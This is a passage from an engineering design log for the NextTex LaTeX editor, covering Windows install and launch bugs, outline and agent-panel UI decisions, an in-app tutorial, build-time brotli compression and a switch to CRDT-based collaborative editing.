So there is now one `tex_tool` in `survey.py` that both callers use, PATH is
corrected before anything asks what is installed rather than only where
something was installed, and the five tool names live in one tuple. The
suffixes matter too: TinyTeX ships `tlmgr.bat` next to `latexmk.exe`, and
the old survey code checked `.bat` for one and `.exe` for the other.

**Why this one is worse than a crash.** It fires only when TeX is already
present, so it cannot happen on a first install and must happen on every
one after that. The person is told the install worked. They find out it did
not days later, when a build fails, with nothing to bring back. A failure
that reports success is not a smaller bug than one that stops; it is the
same bug with the evidence removed.

### Detection and execution disagreeing about one word

Fixing the previous bug unblocked the step it had been skipping, and the
step failed immediately:

    Adding biber, synctex, chktex, texcount  FAILED
      [WinError 2] The system cannot find the file specified

On a machine where tlmgr was present, working, and had just been detected.
`shutil.which("tlmgr")` returns `tlmgr.BAT`, because it honours PATHEXT.
`subprocess` without a shell goes to `CreateProcess`, which appends only
`.exe` to a bare name and cannot find a `.bat`. The installer ran
`["tlmgr", "install", ...]`, so it asked one function where the tool was,
threw the answer away, and asked a different function to run the name.

That is the third appearance of the same shape in one afternoon. A bare
`shutil.which` that could not see the TeX directory. A `which` bound too
early in a default argument to be replaced. And now a resolved path
discarded in favour of the string it was resolved from. In all three the
code contains the right question and something between the question and the
answer makes it unaskable, which is why they read as correct.

So `tex_tool` returns the path rather than a boolean, and
`install_tex_extras` takes that path with no default, because a default of
`"tlmgr"` is the bug wearing a hat. Twenty-six lines below it, the npm step
already read `shutil.which("npm") or "npm"`: npm is `npm.cmd` on Windows and
somebody had met this before, in the same file, without the lesson reaching
the function above.

**Windows-only, which is why it lasted.** On Linux and macOS `tlmgr` is an
extensionless executable and the bare name resolves, so every test and every
developer install was blind to it. The test now stubs a `.BAT` path
deliberately: a stub returning a bare name would pass whatever the code did,
which makes it a test of nothing.

### A refusal that arrived as a success

Reported from Windows: clicking Sign in with Claude showed "Starting..." and
then nothing, for ever.

The server was not silent. `start_login` checks for a pseudo-terminal, finds
none on Windows, and answers with a sentence naming both ways out: run
`claude auth login` in a terminal once, or use an OpenAI key. It answers with
HTTP 200 and `{ok: false, error}`, because a refusal is not a server fault.
The sign-in pane awaited that call inside a `try`, caught nothing, and went
straight on to open an event stream for a login that had never started. The
one screen that could have shown the explanation was the one that discarded
it.

So the shape of the bug is a status code and a body disagreeing, and the
caller believing the status code. It is the same family as the rest of this
chapter: `shutil.which` and `CreateProcess` disagreeing about a name, a
survey and an installer disagreeing about what "installed" means. Two
answers to one question, and the code consulting whichever is easier to
reach.

The check lives in `loginRefusal` rather than inline, so it can be tested
without rendering a React tree, and so that the rule has a name. A caller
that only catches exceptions is not reading the whole answer.

### A hidden window that reported nothing

The last of the Windows run, and the one that took longest to see because
there was nothing to see. The installer started the server with
`pythonw.exe`, chosen so that logging in did not leave a black rectangle on
the desktop. It does achieve that. It also discards stdout and stderr
entirely, so a server that died on startup died in silence: no window, no
message, no file. The installer printed "started", then "Ready", then a link,
and the browser said the site could not be reached.

`python.exe` runs it now, the window is minimised rather than absent, and
everything it writes goes to `server.log` and `server.err.log` beside the
install log. A minimised window that reports is worth more than a hidden one
that cannot.

That was checked on the machine it was written for, and the check found the
next thing. The server was up, the port was serving, the shortcut had been
rewritten, and both log files were nought bytes after an hour. Not a
redirect failure: Python block-buffers stdout when it is a file rather than
a console, so a process that stays up writes nothing into it however much it
prints, because the buffer never fills and it never exits to flush. Measured
both ways rather than argued: after three seconds a live child's stdout file
was empty and its stderr file was not, and with `-u` the banner was there at
once. So the launcher passes `-u`, on the shortcut as well as the immediate
start.

The reason it matters is that emptiness is what a person reads that file
for. Unbuffered, empty means it never got there. Buffered, empty means
nothing at all, and the success message was naming that file by name while
the installer's failure note named the other one. The reassuring message
pointed at the file that could not contain anything.

**And the installer now checks the address before it prints it.** Printing a
link is not the same as there being something at the end of it, and that step
had never looked. So on an install that undertook to start the server, the
port is polled until it answers or twenty seconds pass, and a silence becomes
a note naming the log rather than a link that fails in the browser a moment
later. Only where the install said it would start something: somebody who
declined that has nothing running on purpose.

That check is the general form of most of this chapter. Every bug here was a
success reported without being verified: an install that skipped tlmgr and
said Ready, a sign-in refusal read as a start, a launch that printed
"started" into the dark.

### An install that succeeded, reported as a failure

From a second Windows machine. The in-app Claude setup ended in red, saying
the CLI had not installed. The installer's own output was still on the screen
above it: "Claude Code successfully installed", version 2.1.267, location
`C:\Users\<name>\.local\bin\claude.exe`. It had installed perfectly.

Between those two messages is a warning the official installer prints, and it
is the whole story: the directory it wrote to is not on PATH, and it asks the
person to add it by hand through System Properties. So the ordinary outcome
of a successful Windows install is a CLI that exists and that `shutil.which`
cannot see. Our fallback looked for `~/.local/bin/claude` with no extension
and missed `claude.exe`, which is the same mistake as running `tlmgr` by a
name Windows cannot resolve: found by the eye, missed by the code.

The second half is worse and would not have shown up until later. The SDK
that actually runs the agent does its own lookup, on PATH, and we had never
told it what we found. So even with detection fixed, the agent would have
failed to start on the machine where the setup screen had just reported
success. `cli_path` now carries the answer across, and there is one resolver
rather than two opinions.

This is the same shape as the rest of the Windows run: two ways of asking
where something is, and the code taking the one that is easier to reach.

### Something to double-click

Asked for directly: a shortcut on the desktop after a successful install, on
every platform, and on Linux only where there is a desktop to put one on.

**It launches rather than bookmarks.** The obvious shortcut is the URL the
installer prints, and it is the wrong one. That URL carries the access token,
so a file on the desktop becomes a second copy of it; it goes stale the
moment the port or the token changes; and it does nothing at all when the
server is not running, which is exactly the state somebody double-clicks in.
So all three platforms run `server/run.py --open`, which reads the
configuration, opens the browser if the port already answers, and otherwise
starts NextTex and opens the browser once it does. One source of truth, and
it works from both states.

Waiting for the port rather than sleeping first: opening the browser
immediately shows a connection error on a cold start, and a fixed delay is a
guess about how long an interpreter takes on somebody else's machine.

**Three files, because three platforms disagree.** A `.desktop` entry with
`Terminal=false` on Linux, a `.command` on macOS, and a `.lnk` on Windows
written from PowerShell, because a `.lnk` is a COM object and because
`GetFolderPath('Desktop')` is the only thing that knows where the desktop
really is once OneDrive has moved it. `XDG_DESKTOP_DIR` is consulted first on
Linux: a desktop called `Skrivebord` with an empty `~/Desktop` beside it
would otherwise get the shortcut in the one nobody looks at.

**It is on the plan, and that is the point.** The plan screen ends with
"Nothing outside this directory is written", and that sentence is most of why
anybody trusts the screen above it. A file appearing on the desktop under it
would make it false, so the shortcut is a seventh item somebody can decline,
and the promise names it when it is going ahead.

The subtle half of that was a fixed item still reporting its default. On a
headless machine the item reads "no desktop on this machine, so there is
nowhere to put one" while `choice()` went on answering "yes", so the plan
promised a shortcut that was never going to be written. Fixing the text
without moving the default would have left the screen lying in a quieter way
than before.

## 19. Navigating a long document, and where the agent's controls belong

Three changes, all of them about a project that has grown past the size the
first design assumed: a rail that could only list files, an agent header with
five things in it, and a panel that had to be folded by hand.

### The rail is a stack of panels, and Files is one of them

The rail held one thing that could not fold, the file tree, and four that
could: the trash, the papers, what the agent reads, and git. That was right
when a project was a handful of files. It stops being right the moment a
document is long enough that finding a section matters more than finding a
file, because the tree then occupies the whole rail to answer a question
nobody is asking.

So **Files becomes a panel like the others**: a 26px header with a label and a
chevron, in the same idiom as `TrashPanel`. It keeps `flex-1` when open, so
nothing about the ordinary arrangement changes. Folded, it gives its height to
Sections.

The tree is **unmounted when folded rather than hidden**. It owns a 700ms
type-ahead and a roving tab stop, and both would still answer the keyboard
from behind a closed panel, a key press that jumps a list you cannot see is
worse than one that does nothing. The cost is that the tree's expanded
folders reset when it comes back; that state was never persisted across a
reload either, so this loses nothing that survived a refresh.

### Sections reads the source, not the .toc

LaTeX already writes a table of contents, into `main.toc`. Using it was the
obvious first thought and the wrong one: a `.toc` exists only after a
successful build and describes the document as it was when that build
started. A writer adding a section wants it in the outline while they are
still typing the title, not one compile later, and a document that does not
currently compile would have no outline at all, which is exactly when
navigating it is hardest.

`frontend/src/outline.ts` therefore parses the buffer. It scans once with an
index rather than matching per line, because three things fall out of that for
free: a title can run across lines, a `%` can hide a heading, and a
`verbatim` block can contain something shaped like one. Line numbers stay
exact, which is what the jump needs.

`\include` and `\input` are listed alongside the sectioning commands and sit
at chapter depth, because **in a skeleton document they are the outline**. A
dissertation's `main.tex` contains no prose and eight `\include` lines; its
table of contents is that list. Clicking one opens the file it names,
resolved against the main file's directory rather than the including file's,
which is how LaTeX itself resolves it.

The outline is recomputed on a 250ms timer behind the keyboard. That timer
used to be the autosave's, and the outline was deliberately refreshed
*before* the save, so that a file whose save was refused did not show the
outline it had when it was last written for as long as the conflict stood.
There are no refused saves any more (§22) and the timer is now only about not
re-parsing a long chapter on every keystroke. `sameOutline` compares the
result and keeps the old array when nothing moved, so typing prose does not
re-render the panel.

The row under the caret is marked with `aria-current` and a small dot rather
than a rule or a heavier weight: the mark moves as the writer types, and a
mark that changes a row's size would shift every row below it several times a
minute. Above the first heading nothing is marked, because that is a real
place to be in a file and not a reason to point at the first section.

### The agent's controls moved under the box

The chat header is 32px and carried the name, what the agent is doing, the
Auto chip, Stop, the usage tally, an overflow menu and a fold chevron. Seven
things in a bar that narrows to 280px is four too many, and the overflow menu
was where the crowding had already been swept.

New conversation, model and auto mode are now **icons in a row under the
composer**, beside Send, with "Template and voice" joining them. Every one of
them is something you reach for while writing the question, so under the box
is where the hand already is; and the row costs no more width than the single
text button it replaces.

Two rules held while moving them:

- **The Auto chip stays in the header.** The icon is the *toggle*; the chip is
  the *state*. A mode that disables the permission fence and survives a
  restart has to be visible without opening anything, and the header is the
  part of the panel that is always on screen.
- **The confirm still asks in place.** "New conversation" opens its two
  buttons above the composer rather than in a dialog, in the same idiom as
  the setup block, so the sentence has room to say that the record is kept.

The icons are five hand-drawn paths at 13px. An icon set would have been
faster to write and would have cost tens of kilobytes on a bundle with about
24kB of headroom.

The model popover opens upward from its button and dismisses through the
anchor-aware `useDismiss`: the same hook, with the same trigger ref, that
the usage panel needed. Any new toggle popover in this app must pass its
anchor or it will close on `pointerdown` and reopen on `click`.

### Several previewed documents

A project builds one document per previewed file rather than one per
project. `esi.tex` beside `main.tex` is the case: two documents in one
folder, neither including the other, and before this the only way to build
the second was to make it the main file and change it back.

Three things had to become per-document that were per-project: the preview
stand-in (now named after its document and written beside it, which is what
the compiler's module docstring always said it needed), the scope marker
recording whether a PDF is whole or an `\includeonly` slice, and the
scheduler with its own idea of whether the next build must be a full one.
Jobname collisions are refused with a 409 rather than worked around: two
documents whose stems match would each serve the other's page, and a build
directory per document would move `main.pdf` and break every Makefile
pointed at it.

**What rebuilds on a save is decided by `nexttex/deps.py`**, which follows
`\input`, `\include`, `\subfile`, `\includestandalone`, `\import`,
`\bibliography` and `\includegraphics`. Its two fallbacks are asymmetric on
purpose: an unrecognised `.tex` goes to the first document only, because the
usual unknown is a file just created and not yet included anywhere; an
unrecognised asset goes to every document, because under-attributing one
leaves a preview that silently stops updating.

**Builds queue rather than run together**, one at a time across the project,
with the visible tab first. Each scheduler already serialises itself, but two
`latexmk` runs in one build directory would write over each other's
`.fdb_latexmk` and biber temporaries. There is no preemption: a running build
is never abandoned for a newer one of a *different* document, and superseding
a build of the *same* document happens before the queue is joined, a request
that queued first would otherwise wait for a slot held by the build it means
to replace.

Below 900px the preview has no header of its own, so the strip shares the
row that carries the source/preview toggle. Without that there was no way to
change document with a mouse at that width: the same hole the agent button
had, in the same place, for the same reason: a control that lives in a pane
disappears with the pane.

### Text on the page can be selected

The preview was a canvas, so the page was a picture: it could not be
selected, searched or copied out of, which for a document somebody is quoting
from is most of what a PDF is for. Each page now carries a `pdf.js` text
layer, transparent spans positioned over the glyphs, built only for pages
on screen and only once per page per build.

Held to the pinch benchmark, which is the thing that could have made this a
bad trade. Over sixty wheel events in twenty frames: layouts stay at 40, the
number that mattered, and the whole gesture costs about 3.8 ms more in style
and script, under 0.2 ms a frame. During a zoom the layer is transformed
rather than rebuilt, because rebuilding several hundred spans per frame is
precisely the cost the coalescing handler exists to avoid; without it a
selection made mid-gesture would land a word out.

Pointer events pass through the layer and are taken only by its spans, so the
double-click that jumps to the source still reaches `.nx-page` beneath it.

### One shortcut, and why it is not Super-A

The agent panel is two different things depending on width: below 1400px an
overlay that slides over the preview, above it a column that folds. One
shortcut has to do whichever is on screen, and opening it puts the caret in
the box, a shortcut that opens a panel you then have to click into has saved
nobody anything.

Super-A was asked for and is not available. On Linux the window manager takes
Super before the browser sees it; `Cmd/Ctrl-A` alone is Select All, which an
editor cannot give up; `Cmd/Ctrl-Shift-A` is Chrome's own tab search; and
`Cmd/Ctrl-/` is CodeMirror's toggle-comment, bound by `defaultKeymap`. **The
binding is `Cmd/Ctrl-Alt-A`**, which keeps the A, the part worth keeping,
and is free in both keymaps and both browsers. It is read from `event.code`
rather than `event.key`, because with Alt held macOS reports the character
the combination would type.

**Escape closes it from inside it, and never opens it.** Scoped rather than
global, and the first attempt was global: Escape is also how a keyboard gets
out of CodeMirror, where Tab indents rather than moving on, so a binding
that listened everywhere shut the panel every time somebody pressed Escape
to tab away from the editor, and the accessibility spec that tabs from the
editor to the composer caught it. Escape dismisses the thing you are in,
here as everywhere else in the app. The pairing with `Cmd/Ctrl-Alt-A` still
holds, because that shortcut leaves the caret in the composer.

Two things still have to be true. The tutorial, the history panel and the
context sheet own Escape while they are open, and close themselves. And a
popover *inside* the panel claims it by preventing the default: a claim not
visible synchronously, since window listeners run in the order they were
added and those components mount long after the shell, so the decision waits
a turn and then reads `defaultPrevented`.

### One way to the agent, floating in the corner

The agent used to be reached by two controls that were never both present: a
vertical strip at the right edge above 1400px, and a button in the editor's
tab row below it. That button lives inside the editor pane, which is hidden
when the source is folded away and when the preview has the window below
900px: **so in two ordinary layouts there was no way to reach the agent with
a mouse at all**, only `Cmd/Ctrl-Alt-A`. Both e2e cases now exist.

One control instead, in the shell rather than in any pane, in the same corner
whatever the layout is doing: a floating pill above the chat overlay's `z-30`
and below the tutorial's `z-40`, clear of the 26px preview footer and of the
centred toasts. It travels left by the panel's width when the panel is
docked, so the panel never covers the thing that closes it.

It carries the provider's mark rather than its name alone, drawn as geometry
rather than traced: a trademark reproduced badly from memory looks worse
than no logo, and the name is beside it either way. On the mark sits a state
dot fed by `thinking` and `awaitingPermission`. That dot earns its place:
*the agent is waiting for you to allow something* was invisible whenever the
panel was closed, which is precisely when it needed saying. It breathes
rather than spins: a turn can run for a minute, and something spinning for a
minute reads as an error long before it reads as progress.

### The rail scrolls rather than pushing its panels out

Every expanded panel in the rail is `shrink-0`, which is right: a list
squeezed to two rows is worse than one you scroll to. But the column had no
answer for their natural heights adding up to more than the rail is tall, and
the lower ones were simply pushed out of the pane: on a fourteen-chapter
project at 700px, "What Claude reads" sat 184px below the bottom with no way
to scroll to it. The stack is now its own scroll container. `min-h-0` matters
as much as the overflow: a flex child will not scroll until it is allowed to
be shorter than its content.

### Reaching for the preview puts the overlay away

Below 1400px the panel lies over the preview, and the click that means "let me
read this" was leaving it covered. A `pointerdown` on the preview pane now
closes the overlay, `pointerdown` rather than `click` so it lands before the
preview header's own single/double-click timer and never turns a fold into a
mode change, and nothing is prevented, so the click still reaches the page.

Only when the panel is actually covering something. Docked, above 1400px,
clicking the preview does nothing to it: a panel that vanished on every click
into the document would be unusable.

While the specs for this were being written, the same double click that
enters reading mode was found to leave the project. The preview header shows
the project controls in place of its own label once the rail has folded away,
which in reading mode it always has, so the second half of the gesture landed
on "switch project". The controls moved to the right of the bar, beside the
fold chevron. The left of a header a writer double clicks has to stay inert.

### What the design review changed

Rendered at four widths in both themes and read against this document. Six
things it found, in the order they mattered.

**The auto-mode switch was never `--warn`, and turned `--hint` under the
pointer.** The icon carried `text-warn`, but `styles.css` is imported after
Tailwind and unlayered, so `.quiet { color: var(--ink-3) }` beats any colour
utility from `@layer utilities`. Worse, `.quiet:hover:not([data-tone])`
repainted it to `--hint` on hover: the one control that lowers the permission
fence turned the colour that means "safe and interactive" at the moment your
pointer reached it. The stylesheet's own comment names this exact failure for
a Delete control. The fix is the escape hatch already there: a new
`.quiet[data-tone="warn"]` beside `[data-tone="danger"]` and `[data-tone="on"]`,
and `data-tone` on the buttons instead of a utility class. Moving `.quiet`
into a layer would have fixed it and broken every other place the build
relies on that precedence.

**The two blocks that open above the composer were unreachable by keyboard.**
They render before the textarea and their triggers come after it, so Tab from
the trigger walked forward past them and never arrived. Both now take
`useDismiss` (which brings Escape and outside-press with it), move focus into
the block on open and hand it back on close. The new-conversation block
focuses "Keep this one" rather than "Start new": it ends a conversation, so
the default answer is no.

**Every section was a tab stop.** §10 records fixing precisely this for the
file tree, which is one stop with arrow keys rather than forty. The list now
does the same, with Home and End.

**An `\include` for a file that is not there did nothing, silently.** A
chapter not yet written is the normal state of a skeleton document, and a row
that hovers and answers nothing is worse than one that says so. Those rows
are drawn `--ink-3` and disabled, which also names the compile error coming
next.

**The preamble was heading the table of contents.** A dissertation's main.tex
loads `preamble/formatting` and `preamble/macros` with `\input` before
`\begin{document}`, so the outline opened with two rows of machinery. Includes
seen before the document begins are dropped, but only if the file begins one
at all: a chapter is included into something else and has no preamble to
separate, so everything it pulls in stays.

**Two spec deviations.** Rows were 24px against §4's 26, and indented by 11px
against §5's 13 -- which is the width of a lowercase *n* and the reason the
file tree indents the way it does. Both corrected, so the two lists in the
rail sit on one grid.

The caret row also took a `--surface-2` fill on top of its dot, which made it
the one row in the panel that did not answer the pointer. The dot carries it
alone, as this section said it should.

Left alone, deliberately: the model popover covers the composer while it is
open. Detaching it from its button to clear a half-written question would
read as a floating panel rather than a menu, and the draft is still there
when it closes. And folding Files takes the file actions with it, which is
the reachability hole `FileTree` argues against -- but the fold is explicit,
one click reverses it, and the alternative was to drop the panel header the
rail's whole new idiom rests on.

The rail's fold button still says "Fold the file list away" though the rail
now holds six panels. Renaming it collided with the agent panel's own "Fold
this panel away", which two specs address by name, and every unique
alternative left the button and the strip it folds into ("Show files")
reading as a mismatched pair. The file list is still the bulk of what is
there.

## 20. A tutorial that can be read while you use the thing it describes

The app explains itself well in places, the status strip names the first
error in English, the git panel offers a repository before you ask, the
welcome message says what the agent is for, but none of that adds up to an
answer to "what is this and how do I use it". `docs/first-session.md` is
that answer and it is not reachable from the app, which over Tailscale may
be running on a machine the reader does not have the repository on.

### It is a sheet, and it does not dismiss

The shape was the whole design question. Every dialog in this app is a small
anchored card, 248 to 320 px, and each one closes on an outside press. A
tutorial with nine sections and six figures is an order of magnitude more
content than anything the app shows at once.

**A right-hand sheet, 380 px, full height, over the preview.** `History` is
the precedent: it is the one existing surface that is a full-height sheet
*and* the one surface that does not call `useDismiss`, so it stays open
while you click around the editor. That second property is the whole reason
it is the right model here. A tutorial whose third section says *"a single
click on a pane's header folds that pane away"* and then closes the instant
you try it is worse than no tutorial.

380 rather than History's 264 because body text at 13/20 inside 356 px of
measure is about 58 characters, inside §3's 68ch ceiling; at 264 the measure
is 40ch and a figure would be 240 px wide, below legibility for anything
containing interface text.

It never docks, and that is arithmetic rather than taste. At the 1400 px
breakpoint the rail and the agent already take 620 px, leaving 780 for an
editor and preview whose minimums total 740. A docked tutorial column would
need a window around 1800 px before it fit, so the flag would be dead code
at every width most people run.

It covers the preview because the preview is the one pane no section asks
you to touch: the rail's panel headers, the tab strip's empty run, the
gutter, the status strip, the composer's icon row and the git footer all
stay visible behind it. Below 1400 px the agent is itself an overlay over
the preview, so opening the tutorial puts it away, the same handoff, for
the same reason, that the preview pane already performs on a pointer press.
Closing the tutorial does not bring the agent back; `⌘⌥A` does, and the
tutorial's own shortcut table names that key two sections away.

Rejected, each for a reason particular to this app: a **centred modal**,
because §5 reserves modals for surfaces that are the whole of what you are
doing, and a tutorial about the layout is the opposite: it would cover the tab
strip, gutter and status strip that half the content points at; a **new
`view`**, because it would unmount the editor and throw away the layout the
reader is being taught about; a **rail panel**, because the rail auto-collapses
below 1100 px and cannot describe itself while covering itself; **disclosure
inside the settings**, because those are dismissed by an outside press, so the
first attempt to try a gesture would close them.

### One scrolling document, and an index one click from it

This is reference material as much as a first read, and both uses are served
by a single scrolling document ordered by when you meet each thing.

The index above it used to be a fixed block of every section. **That
arrangement set its own tripwire and then walked past it twice.** The
paragraph here said: "Nine rows at 26 px is what makes the block fixed
rather than scrolling, and a tenth section is the practical signal to cut
one instead." There are eleven sections. Nobody cut anything and nobody
re-read this, so 290 px of a 380 px sheet, a third of the surface, above
the fold, permanently, was an index of places a first-time reader has not
been yet.

It is one 30 px row now, and it does two jobs at once. Closed, it names the
section you are in, which is the other thing the old block did badly: the
mark was a 4 px dot at the end of a row, on the far side of the sheet from
the words it marked. Open, it is the same list it always was, and choosing
from it closes it again, because you asked to be somewhere rather than to
have a list.

**Still not an accordion**, and the distinction is the whole reason this is
allowed. What collapses is the index, not the document: every section stays
expanded, so Ctrl-F still finds every word, and the only text hidden by the
closed state is a list of links whose words are also the headings they point
at. Collapsing the *sections* would still be wrong for exactly the reason
recorded here before.

The row you are in is marked with a 2 px leading bar in `--pen`, which is
what the file tree, the history panel, the diagnostics list and the folder
chooser all use to say "this one", §19's argument against a fill still
holds and the bar was always the app's answer to it. One tab stop with arrow
keys, not eleven, for the reason §10 and §19 both give; opening the index
puts the caret on the section you are in, so the first arrow moves from where
you are.

**And the sections are numbered.** `Section`'s docstring has called them "one
numbered part of the tutorial" since it was written and nothing was numbered.
A number is only worth drawing when the thing really is a sequence, and this
one is: read top to bottom the first time, dipped into afterwards, which is
the shape a number serves. It also gives the closed row something exact to
say.

**Each section leads with the sentence it would give if it could give only
one**, set in `--ink` where the rest of the prose is `--ink-2`. Eleven
sections of three or four undifferentiated paragraphs in a 380 px column is a
wall; eleven leads is a page a reader can skim for the answer they came for.
It is the first paragraph promoted rather than a summary written on top of
one, a section whose opening sentence cannot carry it wants rewriting rather
than labelling.

### Figures

Six, in both themes, and the selection rule is what keeps it to six: **a
screenshot earns its place only if it shows an unlabelled target you cannot
otherwise point at, or a state that is not currently on screen.** The reader
is inside the app, so a picture of something visible and already labelled is
the least informative figure there is. That rule cuts the obvious first idea
: there is no overview shot of the four panes, because the reader is looking
at them.

What survives: the tab strip's empty run (invisible by definition), the
errors drawer (a state you cannot conjure without breaking your document),
an edit chip opened to its diff, a permission card, the composer's row of
unlabelled buttons, and the git card that never returns once dismissed.

`prefers-color-scheme` is the wrong test for choosing between them. §2 is
explicit that the theme here is *"authored and chosen, not inherited"* and
stamped on the root; `e2e/shots/hero.spec.ts` already carries the scar from
assuming otherwise. The figures read `data-theme` and follow the
`APPEARANCE_CHANGED` event, so switching theme with the sheet open moves
them in the same frame as everything else.

Every figure carries `width` and `height` so nothing reflows as images
arrive, its caption says what to look for, and its alt text says what the
picture is, they are not the same sentence.

**The figures are generated, not cropped by hand**, by `e2e/shots/tutorial.spec.ts`
and regenerated with one command:

```
cd e2e && node_modules/.bin/playwright test --config shots.config.ts tutorial.spec.ts
```

This document's opening rule is that the build and the specification may not
drift silently. A hand-made screenshot of an interface that has since moved
on is exactly that drift, in the one surface whose entire purpose is to
describe the build.

### Cost

Both surfaces are `React.lazy`, as `Pdf` already is. The initial chunk grew
**1.6 kB**, two `lazy()` calls, two buttons and two booleans, against a
760 kB budget; the tutorial itself is a 25 kB chunk and the guide a 2 kB one,
neither fetched until opened.

One deviation from the plan, recorded rather than hidden: four of the
figures are under Vite's 4 kB inlining threshold and are therefore base64 in
the tutorial chunk rather than separate files. The intent of the rule was to
keep images out of what a first visit downloads, and that is satisfied,
they are inside a chunk nobody fetches unless they open the tutorial. Raising
`assetsInlineLimit` to zero would have changed asset handling for the whole
app to tidy 12 kB inside a lazy chunk.

### The projects screen gets a different, smaller thing

A question mark left of the cog, wearing the cog's own chrome so the two
read as a pair, opening a 320 px popover in the `PapersChooser` idiom. It
*does* call `useDismiss`: nothing behind it needs trying mid-read, and a
card that follows you around the project list is what that hook exists to
prevent.

Eight labelled lines and no figures at all: every one of them describes
something visible behind the card, which is the figure rule applied
honestly. The two surfaces therefore share their type scale and their
`Section`/`Keys` primitives but not their component: they differ in width,
fill, radius, positioning, focus behaviour, dismissal and whether they carry
images, and a `variant` prop switching all six would be two components
wearing one name.

### Nothing is remembered, and it never opens itself

No stored progress, no scroll restoration, no auto-open on first run. §4
already refused an auto-opening drawer in a passage written about exactly
this temptation, and the app does first-run orientation where it belongs,
`welcome.ts` puts three paragraphs and two buttons in an agent panel with no
conversation yet. A tutorial opening on top of that would be two welcomes
competing for the same thirty seconds. Reopening lands at the top rather
than where you left off, because somebody reopening it is asking a different
question from the one that closed it.

### What was left out, and one thing that was found

Installing, the token in the URL and the `.nexttex/` directory tree stay in
the README and `first-session.md`: the reader is inside a running app, so
the first two describe a problem they do not have.

**Choosing the agent could not be documented, because at the time it could
not be done.** `api.chooseProvider` was reachable only from `SignIn`, which
mounts only when the agent is not yet configured or the session has expired,
so once Claude, OpenAI or "on my own" had been chosen there was no control
anywhere, not in the settings card and not on the projects screen, for
changing it. The tutorial therefore explained how the agent *behaves* and
pointed at the README for how it was chosen. It was written down here as a
missing control rather than a documentation gap, because papering over it in
a tutorial would have been the wrong fix.

**It was built afterwards, and this paragraph is kept for the reason it was
written rather than deleted.** `c527b6e` gave the sign-in screen a way out
that is not a choice, so the screen that chooses an agent can be left
without choosing one. `c59b5e9` then put the route on both screens and named
it after what it does rather than after the state it reports: the settings
sheet carries a `Writing agent: <name>` row whose action is `Change`, or
`Writing agent: not set up` with `Set up` where there is none, and the
projects screen carries the same route in its own chrome beside the cog,
showing which agent it is. The tutorial says you can change it later, and
names the settings route.

## 21. The bundle is compressed once, not on every request

The server was sending 750 kB of JavaScript uncompressed. The obvious fix is
`GZipMiddleware`, and it is the wrong one.

Measured on the real bundle, over a real socket:

| | latency | over the wire |
|---|---|---|
| no compression | 2.3 ms | 750.2 kB |
| gzip middleware, level 9 (Starlette's default) | 40.7 ms | 236.2 kB |
| gzip middleware, level 5 | 22.4 ms | 238.9 kB |
| gzip middleware, level 1 | 11.3 ms | 280.0 kB |
| **precompressed brotli** | **1.6 ms** | **202.2 kB** |

Compressing per request costs about 38 ms of CPU before the first byte
moves, every time. Over loopback that is twenty times the latency of doing
nothing, paid by exactly the people whose link never needed the help. The
crossover is around 100 Mbit/s: below it the smaller transfer pays for the
CPU, above it you are buying nothing with real time. A self-hosted editor
is run on localhost as often as over Tailscale, so no single compression
level is right for both.

Compressing at build time removes the choice rather than splitting it.
`npm run build` writes `.br` and `.gz` beside each asset and
`PrecompressedStatic` hands over whichever the browser asked for. It is
*faster than sending the file uncompressed* -- 1.6 ms against 2.3 -- because
there is less of it to read and write, and it is smaller than anything
worth computing per request.

**Brotli rather than zstd**, on the measurements rather than by reputation:
at build time brotli quality 11 gets the bundle to 202.2 kB where zstd 19
manages 210.5 kB, and brotli has been in every browser for years while zstd
is still missing from Safari. It loses on both size and reach, so there was
no case for it.

The whole thing costs no dependency at either end. Node's `zlib` has brotli
built in, so the compressor is a build step nobody has to install; the
server only reads bytes off disk, so no runtime package either. That
mattered more than it might elsewhere: this is software other people
install, and a mandatory native dependency to save 34 kB would have been a
poor bargain.

Two details that are easy to get wrong and are covered by tests. The
compressed copy is served with the content type of *what it decompresses
to*: a browser handed `application/gzip` downloads the file instead of
running it. And `Vary: Accept-Encoding` goes on every response including
the uncompressed one, or a cache between the browser and here can hand a
brotli body to a client that never asked for one.

## 22. Two people, one file, and the refusal that had to go

This section reverses a decision the app was built around. §"The bugs that
mattered" records that two windows on one project destroyed each other's
work, and the fix: a save carries a tag for what the browser last agreed the
file said, and is *refused* when the file has moved on. That was the right
answer to the problem it was given. It is the wrong answer to a different
one, and this is a record of the difference and of what was deleted.

**Refusing is right when one writer is stale, and wrong when two are
current.** Two tabs belonging to one person are a mistake to be caught: one
of them is behind and its owner does not know. Two people typing at the same
moment are not a mistake at all, and a banner asking which copy survives is
asking somebody to throw away work that nothing was wrong with. No amount of
improving the refusal turns it into an answer for the second case, because
the refusal *is* the answer for the first.

So a file is a CRDT, what is on disk is a projection of it, and the tag, the
banner, `resolveConflict`, the closing-tab beacon and the dirty dot are all
gone. It is worth being clear that this is a deletion and not an addition:
the conflict machinery existed to handle a class of event that no longer
occurs, and leaving it in place beside a merge would have been two answers to
one question.

### Every project, not only the shared ones

The tempting version is to keep the old path for a project nobody has shared
and use documents only when they are needed. That is two save paths with two
conflict semantics and two sets of tests, and the rare one is the untested
one. It is also a worse product: two tabs of your own stop being able to
fight on the day this lands, whether or not anybody else is involved.

### One document per file, not one per project

A project's manifest is one document; each text file is another. One document
for the whole project is the obvious shape and it fails on the first screen:
a two-megabyte thesis with a year of tombstones behind it would be a
multi-megabyte download every time the project opened, and the browser needs
the file you are editing, not all forty. It would also break remote cursors,
because a `y-codemirror.next` relative position only decodes against the
document it was made in.

### Keyed by file id, and where that id comes from

Rename a chapter on one machine while somebody is typing into it on another,
and the text has to land in the same document regardless. So the manifest is
keyed by an id and a path is a *property* of a file.

For a project NextTex has seen before, that id is `history.slug_for(path)` --
the sha16 the version log has always been keyed by. That is not a
coincidence being exploited so much as the same question having the same
answer twice, and it means an existing project keeps its entire history
attached with no migration step at all.

### Presence for display, focus for the agent

Awareness carries cursors, and it would have been easy to make the agent's
"here" and "this" read from it too. That was rejected: it couples the agent
to a JavaScript wire encoding that would then have to be re-implemented in
Python and kept in step for ever. `session.presence` stays a plain dictionary
fed by the editor, and it answers only for *local* clients -- a collaborator
in another time zone must never be able to change what "this paragraph"
means to your agent.

Awareness itself did end up being parsed on the server, for a different and
narrower reason: see the ghost, below.

### What the tests had to be rewritten to say

`tests/api/test_two_tabs.py` and `e2e/specs/two-tabs.spec.ts` were the specs
for the refusal, and inverting them is the honest record of the change: the
test that asserted a stale tab is turned away now asserts that both edits
survive and nobody is asked anything. The browser specs also stopped waiting
for a `PUT /file` response, because there is no save request to wait for; they
poll the file instead, which is what they were using the response as a
stand-in for.

### Five things that cost an hour each

